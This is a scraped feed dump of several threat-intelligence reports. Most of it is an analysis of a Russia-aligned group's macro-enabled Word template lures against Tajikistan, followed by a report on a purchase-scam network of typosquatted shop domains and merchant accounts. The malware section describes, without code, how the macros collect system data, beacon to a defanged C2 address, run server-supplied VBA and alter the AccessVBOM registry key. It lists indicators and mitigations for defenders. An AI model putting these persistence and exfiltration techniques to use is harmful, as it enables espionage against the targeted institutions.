In this campaign, TAG-110 leveraged Tajikistan government-themed documents as lure material, consistent with its historical use of trojanized legitimate government documents, though the authenticity of the current samples could not be independently verified. These documents were distinct from those used in previous campaigns (<a href=\"/research/russia-aligned-tag-110-targets-asia-and-europe\">1</a>, <a href=\"https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia\">2</a>, <a href=\"https://cert.gov.ua/article/6280129\">3</a>, <a href=\"https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/\">4</a>), notably lacking an embedded <a href=\"https://learn.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)\">HTA</a>-based payload HATVIBE within them, which TAG-110 has deployed since at least 2023. In this campaign, TAG-110 has shifted to using macro-enabled Word template files (.dotm files) rather than HATVIBE for the initial payload. Given TAG-110’s historical targeting of public sector entities in Central Asia, this campaign is likely targeting government, educational, and research institutions within Tajikistan.</p>\n        <p>Russia’s Central Asian policy centers on preserving a post‑Soviet sphere of influence by embedding itself at the core of the region’s security, economic, and political architecture. TAG-110's activities continue to bolster this policy through intelligence-gathering operations. Insikt Group anticipates TAG‑110 will sustain regional operations against government ministries, academic and research bodies, and diplomatic missions, particularly those involved in upcoming elections, military operations, or other events the Kremlin wishes to influence.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>TAG-110 has changed its spearphishing tactics in recent campaigns against Tajikistan, as they now rely on macro-enabled Word templates (.dotm files).</li>\n          <li>This campaign has been attributed to TAG-110 based on its reuse of VBA code found in lures from previous campaigns, overlap in C2 infrastructure, and use of suspected legitimate government documents for lure material.</li>\n          <li>TAG-110’s persistent targeting of Tajik government, educational, and research institutions supports Russia’s strategy to maintain influence in Central Asia. These cyber-espionage operations likely aim to gather intelligence for influencing regional politics or security, particularly during sensitive events like elections or geopolitical tensions.</li>\n          <li>TAG-110’s recent use of macro-enabled Word templates (.dotm), placed in the Microsoft Word STARTUP folder for automatic execution, highlights a tactical evolution prioritizing persistence. Organizations should monitor the Word STARTUP directory for unauthorized additions and enforce strict macro security policies.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>TAG-110 is a Russia-aligned threat actor overlapping with UAC-0063, which has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. TAG-110 has conducted cyber-espionage campaigns primarily targeting Central Asia since <a href=\"https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ\">at least 2021</a>. Historically, this group has been known for its use of macro-enabled Word documents to deliver malicious payloads such as HATVIBE, an HTA-based malware designed for initial access and persistence. In November 2024, Insikt Group <a href=\"/research/russia-aligned-tag-110-targets-asia-and-europe\">highlighted</a> TAG-110’s use of HTA-embedded spearphishing attachments in emails tailored for Central Asian diplomatic entities. TAG-110’s operations have been documented by organizations such as <a href=\"https://cert.gov.ua/article/4697016?fbclid=IwAR1B5gj0v-Ve9Q5299ydM5lrInLuKVmvPRosQkUucq6YzcjuTgVnM_x3LjQ\">CERT-UA</a>, <a href=\"https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia\">BitDefender</a>, and <a href=\"https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt28-conducts-cyber-espionage-on-central-asia-and-kazakhstan-diplomatic-relations/\">Sekoia</a>, with recent campaigns targeting entities in Kazakhstan, Uzbekistan, and other Central Asian states. TAG-110 continues to use a variety of custom malware families to conduct espionage activities, including CHERRYSPY (DownExPyer), LOGPIE, and PyPlunderPlug.</p>\n        <h2>Threat Analysis</h2>\n        <p>Beginning in January 2025, Insikt Group detected new TAG-110 first-stage payloads, which suggested the threat actors were evolving their tactics. Previously, TAG-110 leveraged macro-enabled Word documents to deliver HATVIBE, an HTA-based malware, for initial access. The newly detected documents do not contain the embedded HTA HATVIBE payload for creating a scheduled task and instead leverage a global template file placed in the Word startup folder for persistence.</p>\n        <h3>Document Analysis</h3>\n        <div>\n          <div>\n            <div>SHA256 Hash</div>\n            <div>d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7</div>\n          </div>\n          <div>\n            <div>Document Name(s)</div>\n            <div>documents.php</div>\n          </div>\n          <div>\n            <div>Document Creation Time</div>\n            <div>2024-12-24 06:47:00 UTC</div>\n          </div>\n          <div>\n            <div>First Seen</div>\n            <div>2025-01-27 09:18:33 UTC</div>\n          </div>\n          <div>\n            <div>First Seen Triage</div>\n            <div>2024-01-31 18:16:00 UTC</div>\n          </div>\n          <div>\n            <div>C2 Host</div>\n            <div><a href=\"http://38.180.206%5C%5C%5B.%5D61:80/engine.php\">http://38.180.206\\\\[.]61:80/engine.php</a></div>\n          </div>\n          <div>\n            <div>File Type</div>\n            <div>MS Word 2007+ Macro-Enabled Template (.dotm)</div>\n          </div>\n        </div>\n        <p><strong>Table 1:</strong> Metadata of d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 (Source: Recorded Future)</p>\n        <p>The first document (<strong>Figure 1</strong>) appears to be a notice to the armed forces of Tajikistan themed on ensuring radiation safety.

In this campaign, TAG-110 leveraged Tajikistan government-themed documents as lure material, consistent with its historical use of trojanized legitimate government documents, though the authenticity of the current samples could not be independently verified. These documents were distinct from those used in previous campaigns (1, 2, 3, 4), notably lacking an embedded HTA-based payload HATVIBE within them, which TAG-110 has deployed since at least 2023. In this campaign, TAG-110 has shifted to using macro-enabled Word template files (.dotm files) rather than HATVIBE for the initial payload. Given TAG-110’s historical targeting of public sector entities in Central Asia, this campaign is likely targeting government, educational, and research institutions within Tajikistan.\nRussia’s Central Asian policy centers on preserving a post‑Soviet sphere of influence by embedding itself at the core of the region’s security, economic, and political architecture. TAG-110's activities continue to bolster this policy through intelligence-gathering operations. Insikt Group anticipates TAG‑110 will sustain regional operations against government ministries, academic and research bodies, and diplomatic missions, particularly those involved in upcoming elections, military operations, or other events the Kremlin wishes to influence.\nKey Findings\nTAG-110 has changed its spearphishing tactics in recent campaigns against Tajikistan, as they now rely on macro-enabled Word templates (.dotm files).\nThis campaign has been attributed to TAG-110 based on its reuse of VBA code found in lures from previous campaigns, overlap in C2 infrastructure, and use of suspected legitimate government documents for lure material.\nTAG-110’s persistent targeting of Tajik government, educational, and research institutions supports Russia’s strategy to maintain influence in Central Asia. These cyber-espionage operations likely aim to gather intelligence for influencing regional politics or security, particularly during sensitive events like elections or geopolitical tensions.\nTAG-110’s recent use of macro-enabled Word templates (.dotm), placed in the Microsoft Word STARTUP folder for automatic execution, highlights a tactical evolution prioritizing persistence. Organizations should monitor the Word STARTUP directory for unauthorized additions and enforce strict macro security policies.\nBackground\nTAG-110 is a Russia-aligned threat actor overlapping with UAC-0063, which has been linked to APT28 (BlueDelta) with medium confidence by CERT-UA. TAG-110 has conducted cyber-espionage campaigns primarily targeting Central Asia since at least 2021. Historically, this group has been known for its use of macro-enabled Word documents to deliver malicious payloads such as HATVIBE, an HTA-based malware designed for initial access and persistence. In November 2024, Insikt Group highlighted TAG-110’s use of HTA-embedded spearphishing attachments in emails tailored for Central Asian diplomatic entities. TAG-110’s operations have been documented by organizations such as CERT-UA, BitDefender, and Sekoia, with recent campaigns targeting entities in Kazakhstan, Uzbekistan, and other Central Asian states. TAG-110 continues to use a variety of custom malware families to conduct espionage activities, including CHERRYSPY (DownExPyer), LOGPIE, and PyPlunderPlug.\nThreat Analysis\nBeginning in January 2025, Insikt Group detected new TAG-110 first-stage payloads, which suggested the threat actors were evolving their tactics. Previously, TAG-110 leveraged macro-enabled Word documents to deliver HATVIBE, an HTA-based malware, for initial access. The newly detected documents do not contain the embedded HTA HATVIBE payload for creating a scheduled task and instead leverage a global template file placed in the Word startup folder for persistence.\nDocument Analysis\nSHA256 Hash\nd60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7\nDocument Name(s)\ndocuments.php\nDocument Creation Time\n2024-12-24 06:47:00 UTC\nFirst Seen\n2025-01-27 09:18:33 UTC\nFirst Seen Triage\n2024-01-31 18:16:00 UTC\nC2 Host\nhttp://38.180.206\\\\[.]61:80/engine.php\nFile Type\nMS Word 2007+ Macro-Enabled Template (.dotm)\nTable 1: Metadata of d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 (Source: Recorded Future)\nThe first document (Figure 1) appears to be a notice to the armed forces of Tajikistan themed on ensuring radiation safety.

The AutoExec macro completes the following operations:\nChecks to see the last time Microsoft Word was started; this is stored and maintained by the global template in the registry location HKEY_CURRENT_USER\\Software\\Microsoft\\Office<Version>\\Word\\Options\\LastTime -- If the value of LastTime is less than 60 seconds, AutoExec will end execution\nCollects the following system information and stores it in JSON format: -- Computer name -- Username -- Region -- Monitor resolution -- Language -- System version\nWaits three seconds before executing the getInfo()Sub procedure, per Figure 5.\nFigure 5: AutoExec() Sub procedure of 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 (Source: Recorded Future Malware Intelligence)\ngetInfo() Sub Procedure\nThe getInfo() Sub procedure initiates communication between the victim and the C2 server. The procedure accomplishes this by completing the following operations:\nCreates an HTTP request object and makes an HTTP POST to the URL http://38.180.206[.]61/engine.php\nPer Figure 7, the HTTP request has the following characteristics:\n            \nContent-type header set to application/x-www-form-urlencoded\nUser-Agent header set to a Base64-encoded ID unique in both samples\nPOST data in the format of opamczqwe=&ywalokmsz=\nIf the C2 server’s response starts with \"%%%%,\"” the Sub procedure will take the rest of the string after it and use that as the argument in the start Sub procedure\nIf the server HTTP response does not start with \"%%%%,\" it will wait ten seconds and try again until it gets a response starting with “%%%%”\nThe sample d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 makes use of a count loop where the collected data is only sent in every tenth HTTP POST, whereas the sample 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 will only send the collected data on the first HTTP POST\nFigure 6: getInfo() Sub procedure of 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 (Source: Recorded Future)\nFigure 7: PCAP output of a HTTP POST from 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 (Source: Recorded Future)\nstart() Sub Procedure\nThe start() Sub procedure is likely used to execute additional VBA supplied in C2 responses. The Sub procedure accomplishes this by completing the following operations:\nIt splits the remaining C2 response, using the string “###” as a delimiter, and stores the values into an array\nThis array of strings is used as variables, likely to create a block of code similar to those used in previous TAG-110 macro-enabled Word documents, such as 6ac6a0dd78d2e3f58e95fa1a20b3ab22b4b49a1ab816dcfb32fd6864e1969ac3, as seen in Figure 8\nThe array values are used to create a COM object (likely WScipt.shell based on code overlap from previous VBA code used by TAG-110) and written to a value in the registry\n            \nThis is likely modifying HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Word\\Security\\AccessVBOM in the registry, as this tactic was used in the previous campaigns\nThis registry modification allows VBA macros to modify and access other VBA projects\nAnother COM object (likely Word.Application based on code overlap from previous VBA code used by TAG-110) will launch Microsoft Word in the background, create a new document inside that Microsoft Word instance, add a VBA module, and execute it after three seconds\nFigure 8: Code overlap between 6ac6a0dd78d2e3f58e95fa1a20b3ab22b4b49a1ab816dcfb32fd6864e1969ac3 (Top) and 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 (Bottom) (Source: Recorded Future)\nFigure 9: start() Sub procedure of 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 (Source: Recorded Future)\nMalicious Infrastructure\nThe files d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 and 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7 share the same C2 server, 38.180.206[.]61. This IP address was previously identified as a HATVIBE C2 server and attributed to TAG-110 by Sekoia. At the time of analysis, Insikt Group could not obtain additional second-stage VBA modules. However, based on TAG-110’s historical activity and tool set, it is likely that successful initial access via the macro-enabled templates would result in the deployment of additional malware, such as HATVIBE, CHERRYSPY, LOGPIE, or potentially a new, custom-developed payload designed for espionage operations.\nMitigations\nMonitor for and alert on creating or modifying global template files in the Microsoft Word startup folder, which may indicate persistent macro abuse.\nDetect and investigate registry modifications to AccessVBOM under HKEY_CURRENT_USER\\Software\\Microsoft\\Office<Version>\\Word\\Security, which may signal attempts to enable or manipulate VBA macro behavior.\nDisable macros by default in Microsoft Office applications and implement Group Policy Objects (GPOs) to prevent users from enabling them unless explicitly approved.\nUse Recorded Future® Threat Intelligence to monitor for newly emerging TAG-110 infrastructure, malware signatures, and phishing document indicators.\nIntegrate Recorded Future Threat Intelligence Modules into SIEM and SOAR platforms to receive real-time alerts on activity linked to TAG-110 and other Russia-aligned threat actors.\nOutlook\nBased on current and past Insikt Group reporting, TAG-110 has consistently used macro-enabled spearphishing documents to deliver malware and establish persistence in target environments. Insikt Group expects TAG-110 to continue leveraging regional events and bureaucratic themes to craft their lures. We also expect the targeting of entities related to government, defense, or public infrastructure in Central Asia to persist, especially around sensitive events such as elections or military activity.\nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A — Indicators of Compromise\nIP Addresses: 38.180.206[.]61 188.130.234[.]189\nSHA256 Hashes: d60e54854f2b28c2ce197f8a3b37440dfa8dea18ce7939a356f5503ece9e5eb7 6c81d2af950e958f4872d3ced470d9f70b7d73bc0b92c20a34ce8bf75d551609 8508003c5aafdf89749d0abbfb9f5deb6d7b615f604bbb11b8702ddba2e365e7\nAppendix B: MITRE ATT&CK Techniques\nTactic: Technique\nATT&CK Code\nInitial Access: Spearphishing Attachment\nRT1566.001\nExecution: Malicious File\nT1204.002\nPersistence: Office Template Macros\nT1137.001\nDefense Evasion: Encrypted/Encoded File\nT1027.013\nCommand-and-Control: Web Protocols\nT1071.001","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1d31fa4236c4358ba10327841148438ed4d409d85.png?width=1200&format=pjpg&optimize=medium"},"content":"Russia-aligned TAG-110 shifts to .dotm phishing lures in a 2025 campaign against Tajikistan’s public sector, advancing cyber-espionage in Central Asia.","contentSnippet":"Russia-aligned TAG-110 shifts to .dotm phishing lures in a 2025 campaign against Tajikistan’s public sector, advancing cyber-espionage in Central Asia.","guid":"https://www.recordedfuture.com/research/russia-aligned-tag-110-targets-tajikistan-with-macro-enabled","categories":["Research (Insikt)"],"isoDate":"1970-01-21T05:31:12.000Z","tag":"intel"},{"title":"Rate My Rizz: Elevating Cyber Resilience Beyond Compliance","link":"https://www.recordedfuture.com/blog/rate-my-rizz","pubDate":"Wed, 21 Jan 1970 05:28:19 GMT","content:encoded":"\n        <p>RSA is always a good opportunity to reconnect with industry friends—2025 was no exception.

For example, merchant data indicates that PETHOUSEN LLC is associated with pethousen[.]com rather than the three scam domains we linked it to (biliability[.]com, dknyonlineuk[.]com, outletmalleu[.]shop). Inaccurately associated merchant URLs often indicate that a merchant is engaging in transaction laundering.</p>\n        <p><strong>Transaction laundering allows threat actors to conceal high-risk or illegal activity by processing payments for an entity, goods, or services unknown to the merchant’s acquiring bank or payment provider.</strong> While the transactions are disguised as low-risk or legitimate purchases, they are often transactions for illegal activities. In this sense, all purchase scam transactions that defraud victims are inherently a form of transaction laundering.</p>\n        <p><strong>It is unclear whether the scam network identified in this report is controlled by a single threat actor or various threat actors acting in concert.</strong> Merchant account abuse for purchase scams frequently overlaps between networks of linked domains, as shown in Figure 2. While merchant accounts dispersed throughout scam networks network can have similarities that suggest a common origin or operator, the networks of scam domains linked to the merchant accounts are often distinct (for example, in their abuse of different ad platforms for propagation to victims)</p>\n        <p>Because of this, we consider the two following scenarios equally likely regarding attribution of the scam network to an operator:</p>\n        <ul>\n          <li>Multiple networks of scam domains operated by different threat actors may be using the same merchant accounts, whose services are rented out as part of a third-party, dark web-based “cash-out” offering.</li>\n          <li>A single threat actor may be controlling the domain and merchant infrastructure for the entire network, intentionally rotating the domain/merchant combinations in an attempt to obscure attribution.</li>\n        </ul>\n        <p><strong>An ecosystem of illicit dark web services likely supports</strong> <strong><a href=\"/research/how-cybercrime-gets-monetized\">fraud-focused threat actors</a>.</strong> These threat actors leverage third-party services for a variety of scam use cases, including the following:</p>\n        <ul>\n          <li><strong>Fraud-based malvertising services:</strong> Threat actors organize illicit advertising services by compromising advertiser accounts for online ad platforms or by purchasing advertising campaigns using stolen financial data.</li>\n          <li><strong>“Cash-out” services:</strong> Threat actors purvey merchant accounts under their control to other threat actors to monetize stolen card data.</li>\n          <li><strong>Traffic services:</strong> Threat actors drive traffic to artificially boost malicious advertisements, including for scam websites, in search results. Alternatively, they partner with cash-out service providers to monetize existing victim traffic to scam domains.</li>\n        </ul>\n        <p><strong>Card issuers and merchant acquirers with access to merchant data can likely leverage merchant analysis for threat actor attribution of this scam network.</strong> Commonalities in merchant registration would likely indicate that the accounts are operated by a single threat actor, whereas discrepancies would indicate that the accounts are operated by various threat actors. Identical company data is an example of a commonality that we would expect to see in linked merchant accounts operated by a single threat actor.</p>\n        <p>Note that since scam domains are easier to acquire and less resilient to detection and mitigation than merchant accounts (and therefore more expendable as infrastructure), we consider domain analysis less likely to enable threat actor attribution of this scam network.</p>\n        <h2>Mitigations for Fraud Prevention</h2>\n        <p>Purchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, apply the mitigation strategies described below.</p>\n        <h3>Card Issuers</h3>\n        <ul>\n          <li>To prioritize fraud prevention over potential customer friction, immediately decline transactions with the identified scam merchant accounts and track customer card accounts that have transacted with the merchant for additional fraud signals before taking action.\n            <ul>\n              <li>Escalate the fraud risk score of customer accounts that attempt transactions with the merchants or flag the account for additional review.</li>\n              <li>Consider the presence of additional fraud signals on flagged accounts as a high-confidence basis to reissue the customer card or apply other remediations.</li>\n            </ul>\n          </li>\n          <li>To minimize customer friction, assess transaction data within your cardholder portfolio with the identified scam merchant accounts before taking action against either the merchant accounts or customer card accounts.\n            <ul>\n              <li>Bucket all customer transactions with the identified merchants.</li>\n              <li>Determine a fraud incidence threshold in accordance with your organization’s risk tolerance. This threshold should be higher than the baseline fraud incidence rate observed across your portfolio.</li>\n              <li>If customer transactions within the bucket exceed the fraud incidence threshold, automatically block all customer transactions with the identified merchant accounts and consider card reissue.</li>\n            </ul>\n          </li>\n        </ul>\n        <h3>Merchant Acquirers</h3>\n        <ul>\n          <li>\n            <ul>\n              <li>Analyze linked merchant domains to identify other likely fraudulent merchant accounts operated within the scam network. Card network acquirer data lookup APIs may enable merchant acquirers to search for merchant accounts based on domain.</li>\n              <li>Scan merchant acquirer BIN and MCC combinations within your merchant portfolio to identify other likely fraudulent merchant accounts registered with similar merchant data or within a short period of time. Card network APIs may enable merchant acquirers to search for merchant account registrations based on acquirer BIN and MCC.</li>\n              <li>Flag suspected fraudulent merchant accounts for enhanced due diligence, investigation, suspension, or termination in accordance with your risk tolerance.</li>\n            </ul>\n          </li>\n        </ul>\n        <h2>Outlook for Purchase Scam Networks</h2>\n        <ul>\n          <li>Our analysis has confirmed that the likely purchase scam network identified in this report has been operational since February 2025. Because we continue to confirm new scam domains within the group are operational, the scam operation appears to be ongoing. By extension, the scam operator will likely continue deploying new domains and online ad campaigns to support their scam activity, especially as old domains and ad campaigns are taken offline.</li>\n          <li>These new scam domains will likely use the merchant accounts identified in this report. Termination or suspension of scam merchant accounts by their acquirers is unlikely to halt all scam activity by the operator. However, this kind of remediation would almost certainly place additional time and resource demands on the scam network operator to acquire new merchant account infrastructure.</li>\n        </ul>\n

","content:encodedSnippet":"Executive Summary\nOn April 19, 2025, Recorded Future® Payment Fraud Intelligence identified lidlorg[.]com as a likely purchase scam website that employs brand impersonation against a German international discount retailer. As of May 8, 2025, our analysis has linked lidlorg[.]com to a network of 71 likely purchase scam websites, including others that combine brand impersonation and online ad campaigns for propagation. All identified scam websites use one or more of twelve shared merchant accounts to process visitor transactions. All transactions with these merchant accounts are highly likely to be fraudulent and facilitate card compromise.\nPurchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, card issuers should take action against identified merchant accounts and card accounts that have transacted with those merchants, while merchant acquirers should take action against the merchant accounts. We describe these mitigation strategies in detail in the Mitigations section of this report.\nKey Findings\nOn April 19, 2025, we identified lidlorg[.]com as a likely purchase scam website that uses brand impersonation against a German retailer.\nThe scam website lidlorg[.]com is likely part of a network of 71 purchase scam domains using the same merchant accounts to defraud victims and steal victim data.\nTransactions with the merchant accounts linked to lidlorg[.]com are highly likely to be fraudulent and facilitate card compromise. These merchant accounts include AKRU KERAMIK GMBH, ANT ONLINE E-COMMERCE STO, BALSAMIC, CLOTHWEARABLY, LMS AESTHETICS, MYCOZYBABIES, ONCLOTHESSHOES, PETHOUSEN LLC, REFINEDHAT, YSP CLOTHINGGSHOP, YSP NIHILSTOOL, and YSP QHWLKJSHOP.\nIt is unclear whether the network of scam domains and merchant accounts is controlled by a single threat actor or various threat actors acting in concert — for example, through partnership on the dark web and the provision of dark web-based services in a greater scam ecosystem.\nTo attribute this scam network to a single threat actor or various threat actors, card issuers and merchant acquirers with access to merchant data can likely leverage commonalities in associated merchant registration information, such as company data.\nThreat Analysis of Purchase Scam Websites\nOn April 19, 2025, Recorded Future identified lidlorg[.]com as a likely purchase scam website. The operators of lidlorg[.]com employed brand impersonation targeting a German international discount retailer chain, as indicated by the use of typosquatting in the domain name and the abuse of a brand logo by “EU STORE” and “L Clearance”, two advertiser accounts linked to lidlorg[.]com (Figure 1). The scam website likely defrauds victims through the use of three linked merchant accounts, which enable the operator to conduct a fraudulent scam transaction while stealing victim personal and financial data for downstream fraud.\nRecorded Future Payment Fraud Intelligence distinguishes purchase scam websites from phishing websites through their use of linked merchant accounts. While the purchase scams we identify are similar to other online scams (especially in their reliance on fraudulent offers for goods and services that buyers will never receive), they are distinct from phishing websites because they can process victim payments rather than simply collecting victim data through bogus form submissions.\nFigure 1: Online ad accounts for the likely scam website lidlorg[.]com impersonate a German brand (Source: Facebook Ads)\nOur analysis indicated that lidlorg[.]com is part of a network of 71 likely scam e-commerce domains, as indicated by overlapping use of scam merchant accounts. All likely scam domains use various combinations of the same merchant accounts for their payment functionality and have been operational since no later than February 2025. Many of the domains also use typosquatting to impersonate multiple brands. At the time of our analysis, many of the domains were associated with active or historical online ad campaigns. Many of these were also removed by the ad platform for “Unacceptable Business Practices,” which includes scam activity. On average, the domains were 65 days old and likely malicious, as indicated by their average DomainTools risk score of 88/100.\nFigure 2 illustrates the links between the identified scam domains and merchant accounts. The Appendix of this report lists the scam domains, merchant accounts, and all timestamps when we confirmed that they were linked.\nFigure 2: This graph demonstrates the overlapping use of eight merchant accounts by 71 scam domains; lidlorg[.]com, the “patient-zero” domain within the investigation, is graphed in light blue (Source: Recorded Future)\nTransactions with merchant accounts linked directly or indirectly to lidlorg[.]com are highly likely to be fraudulent and facilitate card compromise. As of May 8, 2025, lidlorg[.]com has directly used three merchant accounts to process visitor transactions. We linked nine additional merchant accounts to lidlorg[.]com via overlapping use by other scam e-commerce domains within the network.\nMerchant Name\nAcquirer BIN\nMCC\nDate First Seen\nDate Last Seen\nLinked Scam Domains\nAKRU KERAMIK GMBH\n264431\n5719\n2025-04-30\n2025-04-30\n1\n          \nANT*ONLINE E-COMMERCE STO\n270514\n5631\n2025-04-09\n2025-04-09\n1\n          \nBALSAMIC\n270522\n5661\n2025-04-01\n2025-04-09\n2\n          \nCLOTHWEARABLY\n271109, 024440\n5691\n2025-02-25\n2025-03-07\n11\nLMS AESTHETICS\n230230\n5719\n2025-04-23\n2025-04-30\n3\n          \nMYCOZYBABIES\n271109, 024440\n5641\n2025-04-16\n2025-04-26\n5\n          \nONCLOTHESSHOES\n875516\n5311\n2025-04-23\n2025-04-30\n5\n          \nPETHOUSEN LLC\n230509\n5995\n2025-04-19\n2025-04-30\n3\n          \nREFINEDHAT\n271109, 024440\n5691\n2025-04-14\n2025-04-23\n4\n          \nYSP*CLOTHINGGSHOP\n020608\n5621\n2025-03-04\n2025-04-19\n9\n          \nYSP*NIHILSTOOL\n020608\n5311\n2025-03-26\n2025-04-19\n9\n          \nYSP*QHWLKJSHOP\n020608\n5621\n2025-02-25\n2025-04-26\n25\nTable 1: All transactions with merchant accounts linked to lidlorg[.]com are likely to be fraudulent (Source: Recorded Future)\nNote that inaccurate associated merchant URL data suggests that threat actors likely use merchant accounts within this group for transaction laundering. For example, merchant data indicates that PETHOUSEN LLC is associated with pethousen[.]com rather than the three scam domains we linked it to (biliability[.]com, dknyonlineuk[.]com, outletmalleu[.]shop). Inaccurately associated merchant URLs often indicate that a merchant is engaging in transaction laundering.\nTransaction laundering allows threat actors to conceal high-risk or illegal activity by processing payments for an entity, goods, or services unknown to the merchant’s acquiring bank or payment provider. While the transactions are disguised as low-risk or legitimate purchases, they are often transactions for illegal activities. In this sense, all purchase scam transactions that defraud victims are inherently a form of transaction laundering.\nIt is unclear whether the scam network identified in this report is controlled by a single threat actor or various threat actors acting in concert. Merchant account abuse for purchase scams frequently overlaps between networks of linked domains, as shown in Figure 2. While merchant accounts dispersed throughout scam networks network can have similarities that suggest a common origin or operator, the networks of scam domains linked to the merchant accounts are often distinct (for example, in their abuse of different ad platforms for propagation to victims)\nBecause of this, we consider the two following scenarios equally likely regarding attribution of the scam network to an operator:\nMultiple networks of scam domains operated by different threat actors may be using the same merchant accounts, whose services are rented out as part of a third-party, dark web-based “cash-out” offering.\nA single threat actor may be controlling the domain and merchant infrastructure for the entire network, intentionally rotating the domain/merchant combinations in an attempt to obscure attribution.\nAn ecosystem of illicit dark web services likely supports fraud-focused threat actors. These threat actors leverage third-party services for a variety of scam use cases, including the following:\nFraud-based malvertising services: Threat actors organize illicit advertising services by compromising advertiser accounts for online ad platforms or by purchasing advertising campaigns using stolen financial data.\n“Cash-out” services: Threat actors purvey merchant accounts under their control to other threat actors to monetize stolen card data.\nTraffic services: Threat actors drive traffic to artificially boost malicious advertisements, including for scam websites, in search results. Alternatively, they partner with cash-out service providers to monetize existing victim traffic to scam domains.\nCard issuers and merchant acquirers with access to merchant data can likely leverage merchant analysis for threat actor attribution of this scam network. Commonalities in merchant registration would likely indicate that the accounts are operated by a single threat actor, whereas discrepancies would indicate that the accounts are operated by various threat actors. Identical company data is an example of a commonality that we would expect to see in linked merchant accounts operated by a single threat actor.\nNote that since scam domains are easier to acquire and less resilient to detection and mitigation than merchant accounts (and therefore more expendable as infrastructure), we consider domain analysis less likely to enable threat actor attribution of this scam network.\nMitigations for Fraud Prevention\nPurchase scams present financial fraud risks to card issuers and compliance risks to merchant acquirers, especially in cases where linked scam merchant accounts are also abused to support transaction laundering activity. To reduce these risks, apply the mitigation strategies described below.\nCard Issuers\nTo prioritize fraud prevention over potential customer friction, immediately decline transactions with the identified scam merchant accounts and track customer card accounts that have transacted with the merchant for additional fraud signals before taking action.\n            \nEscalate the fraud risk score of customer accounts that attempt transactions with the merchants or flag the account for additional review.\nConsider the presence of additional fraud signals on flagged accounts as a high-confidence basis to reissue the customer card or apply other remediations.\nTo minimize customer friction, assess transaction data within your cardholder portfolio with the identified scam merchant accounts before taking action against either the merchant accounts or customer card accounts.\n            \nBucket all customer transactions with the identified merchants.\nDetermine a fraud incidence threshold in accordance with your organization’s risk tolerance. This threshold should be higher than the baseline fraud incidence rate observed across your portfolio.\nIf customer transactions within the bucket exceed the fraud incidence threshold, automatically block all customer transactions with the identified merchant accounts and consider card reissue.\nMerchant Acquirers\nAnalyze linked merchant domains to identify other likely fraudulent merchant accounts operated within the scam network. Card network acquirer data lookup APIs may enable merchant acquirers to search for merchant accounts based on domain.\nScan merchant acquirer BIN and MCC combinations within your merchant portfolio to identify other likely fraudulent merchant accounts registered with similar merchant data or within a short period of time. Card network APIs may enable merchant acquirers to search for merchant account registrations based on acquirer BIN and MCC.\nFlag suspected fraudulent merchant accounts for enhanced due diligence, investigation, suspension, or termination in accordance with your risk tolerance.\nOutlook for Purchase Scam Networks\nOur analysis has confirmed that the likely purchase scam network identified in this report has been operational since February 2025. Because we continue to confirm new scam domains within the group are operational, the scam operation appears to be ongoing. By extension, the scam operator will likely continue deploying new domains and online ad campaigns to support their scam activity, especially as old domains and ad campaigns are taken offline.\nThese new scam domains will likely use the merchant accounts identified in this report. Termination or suspension of scam merchant accounts by their acquirers is unlikely to halt all scam activity by the operator. However, this kind of remediation would almost certainly place additional time and resource demands on the scam network operator to acquire new merchant account infrastructure.\nAppendix: Identified

Analysis of Model Performance, Investment, and Innovation","link":"https://www.recordedfuture.com/research/measuring-the-us-china-ai-gap","pubDate":"Wed, 21 Jan 1970 05:11:02 GMT","content:encoded":"\n        <h2>Executive Summary</h2>\n        <p>China has stated its ambition to become the world leader in artificial intelligence (AI) by 2030, a goal that encompasses not only the performance of individual AI models that often attract significant media attention but also AI innovation broadly and widespread adoption of AI for economic and geopolitical benefit. Based on an analysis of key industry pillars informing the US-China competition for AI supremacy — including government and venture capital (VC) funding, industry regulation, talent, technology diffusion, model performance, and compute capacity — Insikt Group assesses that China is unlikely to sustainably surpass the United States (US) on its desired timeline. Currently, China either trails behind or does not clearly lead the US in any of these pillars. The US-China AI competition is likely to become tighter, with China's AI industry likely being a close second to the US globally and its AI models possibly outperforming the US at times or in some sectors. Chinese generative AI models likely lag behind US competitors by approximately three to six months as of this writing, based on Insikt Group analysis of publicly available Elo benchmarks, but potential new algorithmic breakthroughs along with agentic and collaborative AI systems could significantly sway the competitiveness of US or Chinese models before 